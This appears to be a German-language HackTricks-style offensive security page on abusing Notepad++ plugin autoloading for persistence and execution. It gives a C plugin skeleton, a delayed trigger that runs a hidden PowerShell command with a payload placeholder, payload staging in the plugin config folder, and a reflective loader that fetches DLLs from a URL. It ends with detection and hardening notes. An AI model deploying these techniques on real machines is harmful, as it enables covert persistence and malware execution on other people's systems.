# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ wird beim Start **jede Plugin-DLL automatisch laden, die in seinen `plugins`-Unterrverzeichnissen gefunden wird**. Das Ablegen eines bösartigen Plugins in einer **schreibbaren Notepad++-Installation** verschafft Codeausführung innerhalb von `notepad++.exe`, jedes Mal wenn der Editor startet, was für **Persistence**, heimliche **initial execution** oder als **in-process loader** missbraucht werden kann, wenn der Editor erhöht gestartet wird.

Seit **Notepad++ 7.6+** ist das erwartete manuelle Installationslayout **ein Unterordner pro Plugin** (`plugins\<PluginName>\<PluginName>.dll`). Im **portable mode** (Vorhandensein von `doLocalConf.xml` neben `notepad++.exe`) bleibt der gesamte Anwendungspfad lokal in diesem Verzeichnis, was kopierte/admin tool bundles oft zu einer leicht benutzerbeschreibbaren Ausführungsoberfläche macht.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (erfordert normalerweise admin zum Schreiben).
- Writable options for low-privileged operators:
- Nutze den **portable Notepad++ build** in einem benutzerbeschreibbaren Ordner.
- Kopiere `C:\Program Files\Notepad++` in einen benutzerkontrollierten Pfad (z. B. `%LOCALAPPDATA%\npp\`) und starte `notepad++.exe` von dort.
- Suche nach **admin tool bundles**, extrahierten zip-Kopien oder help-desk toolkits, die bereits `doLocalConf.xml` enthalten und außerhalb von `Program Files` liegen.
- Jedes Plugin bekommt seinen eigenen Unterordner unter `plugins` und wird beim Start automatisch geladen; Menüeinträge erscheinen unter **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin-Ladepunkte (Execution Primitives)
Notepad++ erwartet bestimmte **exported functions**. Diese werden alle während der Initialisierung aufgerufen und bieten mehrere Execution Surfaces:
- **`DllMain`** — läuft sofort beim DLL-Load (erster Ausführungspunkt).
- **`setInfo(NppData)`** — wird beim Laden einmal aufgerufen, um Notepad++-Handles bereitzustellen; typischer Ort, um Menüeinträge zu registrieren.
- **`getName()`** — gibt den Plugin-Namen zurück, der im Menü angezeigt wird.
- **`getFuncsArray(int *nbF)`** — gibt Menübefehle zurück; selbst wenn leer, wird es beim Startup aufgerufen.
- **`beNotified(SCNotification*)`** — empfängt Notepad++ / Scintilla-Events (nützlich, um Payloads bis zu einer User Action oder einem Editor-Event zu verzögern).
- **`messageProc(UINT, WPARAM, LPARAM)`** — Message Handler, nützlich für größere Datenaustausche.
- **`isUnicode()`** — Kompatibilitäts-Flag, das beim Laden geprüft wird.

Die meisten exports können als **stubs** implementiert werden; Ausführung kann über `DllMain` oder einen beliebigen Callback oben während des Autoload erfolgen.

## Minimal bösartiges Plugin-Skelett
Kompiliere eine DLL mit den erwarteten exports und platziere sie in `plugins\\MyNewPlugin\\MyNewPlugin.dll` unter einem beschreibbaren Notepad++-Ordner:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Baue die DLL (Visual Studio/MinGW).
2. Erstelle den Plugin-Unterordner unter `plugins` und lege die DLL dort ab.
3. Starte Notepad++ neu; die DLL wird automatisch geladen und führt `DllMain` sowie nachfolgende Callbacks aus.

## Low-noise-Trigger-Pattern via `beNotified`
Für OPSEC sollten viele Payloads **nicht** aus `DllMain` ausgelöst werden. Ein unauffälligeres Pattern ist, das Plugin sauber laden zu lassen und erst nach einem realistischen Editor-Event auszuführen, z. B. **startup complete**, **buffer activation** oder dem **ersten getippten Zeichen**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Dies passt besser zu öffentlicher offensiver Forschung als ein lautes `DllMain`-Beacon: Die DLL wird beim Start weiterhin automatisch geladen, aber die bösartige Aktion wird verzögert, bis Notepad++ tatsächlich in Benutzung zu sein scheint.

## Den Plugin-Konfigurationsordner als sekundären Speicher verwenden
Notepad++ stellt `NPPM_GETPLUGINSCONFIGDIR` bereit, das das **Plugin-Konfigurationsverzeichnis des aktuellen Benutzers** zurückgibt. Ein bösartiges Plugin kann dies nutzen, um die DLL auf der Festplatte minimal zu halten, während es verschlüsselte Konfiguration, gestaffelte Payloads oder Tasking-Dateien in einem Pfad speichert, der sich in den normalen Plugin-Status einfügt.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally ist das nützlich, wenn du Folgendes willst:
- eine winzige, automatisch geladene Bootstrap-DLL;
- per-user tasking, ohne das main plugin binary erneut anzufassen;
- den **autoload trigger** von der schwereren zweiten Stage zu trennen.

## Reflective loader plugin pattern
Ein weaponized plugin kann Notepad++ in einen **reflective DLL loader** verwandeln:
- Eine minimale UI-/Menüeintragung bereitstellen (z. B. "LoadDLL").
- Einen **file path** oder eine **URL** akzeptieren, um eine payload DLL abzurufen.
- Die DLL reflectively in den aktuellen Prozess mappen und einen exportierten Einstiegspunkt aufrufen (z. B. eine Loader-Funktion innerhalb der abgerufenen DLL).
- Vorteil: einen harmlos wirkenden GUI-Prozess wiederverwenden, statt einen neuen Loader zu starten; die payload erbt die Integrität von `notepad++.exe` (einschließlich erhöhter Kontexte).
- Trade-offs: Das Ablegen einer **unsigned plugin DLL** auf der Festplatte ist auffällig; eine praktische Variante ist, das automatisch geladene Plugin nur als Stub zu verwenden und das eigentliche implant verschlüsselt/gestaged woanders zu halten.

## Detection and hardening notes
- Schreibe in die **Notepad++ plugin directories** nicht oder überwache dies (einschließlich portabler Kopien in Benutzerprofilen); aktiviere controlled folder access oder application allowlisting.
- Alarme auf **neue unsigned DLLs** unter `plugins`, Änderungen an portablen Notepad++-Bäumen und ungewöhnliche **child processes/network activity** von `notepad++.exe`.
- Erstelle eine Baseline legitimer Plugins und untersuche jede neue DLL, die das normale Notepad++ plugin interface exportiert, aber zusätzlich shells, PowerShell oder network beacons startet.
- Erzwinge die Plugin-Installation nur über **Plugins Admin**, und beschränke die Ausführung portabler Kopien aus untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
